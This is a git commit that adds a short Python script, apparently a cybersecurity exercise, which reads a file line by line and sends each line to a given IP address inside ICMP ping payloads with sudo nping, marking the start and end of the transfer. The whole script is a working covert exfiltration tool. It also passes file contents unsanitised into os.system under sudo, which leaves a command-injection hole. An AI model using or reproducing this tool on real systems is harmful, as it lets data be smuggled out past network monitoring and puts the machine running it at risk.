11c36b17b6613a5617ee2186809b104bb651ce6d
Alexandre SOARES <72209227+AS-37@users.noreply.github.com>
2022-11-27 20:10:20 +0100

    Added python script

---
+++ script_cybersecu.py
@@ -0,0 +1,19 @@
+import sys
+import os
+
+ip_cible = str(sys.argv[1])
+print(ip_cible)
+chemin_fichier = str(sys.argv[2])
+print(chemin_fichier)
+
+file = open(chemin_fichier, 'r')
+lines = file.readlines()
+os.system('sudo nping --icmp -c 1 '+ip_cible+' --data-string BOFfile.txt ')
+
+for index, line in enumerate(lines):
+    #print("Ligne {}: {}".format(index, line.strip()))
+    #line = line.encode('ascii')
+    print(line)
+    os.system('sudo nping --icmp -c 1 '+ip_cible+' --data-string '+ "'"+line+"'")
+os.system('sudo nping --icmp -c 1 '+ip_cible+' --data-string EOF')
+file.close()
